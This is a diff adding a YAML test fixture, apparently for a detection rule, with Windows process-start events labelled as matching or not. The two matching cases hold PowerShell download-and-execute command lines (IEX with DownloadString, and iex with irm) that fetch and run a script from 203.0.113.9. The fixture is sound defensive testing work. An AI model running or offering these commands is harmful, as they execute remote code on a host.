@@ -1,0 +1,37 @@
+docs:
+- id: pos1
+  match: true
+  doc:
+    host:
+      os: {type: windows}
+      name: win1
+    user: {name: alice}
+    event: {category: process, type: start}
+    process: {name: powershell.exe, executable: 'C:\Windows\System32\powershell.exe', command_line: 'powershell -nop -c
+        "IEX (New-Object Net.WebClient).DownloadString(''http://203.0.113.9/a.ps1'')"'}
+- id: pos2
+  match: true
+  doc:
+    host:
+      os: {type: windows}
+      name: win1
+    user: {name: alice}
+    event: {category: process, type: start}
+    process: {name: pwsh.exe, executable: 'C:\Windows\System32\pwsh.exe', command_line: 'pwsh -c "iex (irm http://203.0.113.9/x)"'}
+- id: neg1
+  doc:
+    host:
+      os: {type: windows}
+      name: win1
+    user: {name: alice}
+    event: {category: process, type: start}
+    process: {name: powershell.exe, executable: 'C:\Windows\System32\powershell.exe', command_line: 'powershell Get-ChildItem
+        C:\'}
+- id: neg2
+  doc:
+    host:
+      os: {type: windows}
+      name: win1
+    user: {name: alice}
+    event: {category: process, type: start}
+    process: {name: powershell.exe, executable: 'C:\Windows\System32\powershell.exe', command_line: 'powershell -File C:\scripts\backup.ps1'}
